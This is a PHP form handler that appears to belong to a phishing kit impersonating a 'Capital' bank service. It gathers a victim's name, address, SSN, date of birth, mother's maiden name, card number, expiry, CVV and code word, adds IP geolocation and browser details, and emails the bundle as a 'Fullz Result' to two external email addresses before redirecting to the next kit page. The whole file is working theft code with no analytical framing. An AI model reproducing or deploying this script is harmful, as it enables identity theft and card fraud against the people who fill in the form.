<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Capital Info-----------------------\n";
$message .= "Full Name: ".$_POST['formtext1']."\n";
$message .= "Address: ".$_POST['formtext2']."\n";
$message .= "SSN: ".$_POST['formtext3']."\n";
$message .= "DOB: ".$_POST['formtext4']."-";
$message .= $_POST['formtext5']."-";
$message .= $_POST['formtext6']."\n";
$message .= "MMN: ".$_POST['formtext7']."\n";
$message .= "CC: ".$_POST['formtext8']."\n";
$message .= "ExpDate: ".$_POST['formtext9']."-";
$message .= $_POST['formtext10']."\n";
$message .= "CVV: ".$_POST['formtext11']."\n";
$message .= "CodeWord: ".$_POST['formtext12']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Folazan432-------------\n";
$send = "russellhoughton.ddonwise1000@yandex.com, g.2sulukdze@gmail.com";
$subject = "Fullz Result from $ip";
$headers = "From: Capital Service<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: load4.php");

	 
?>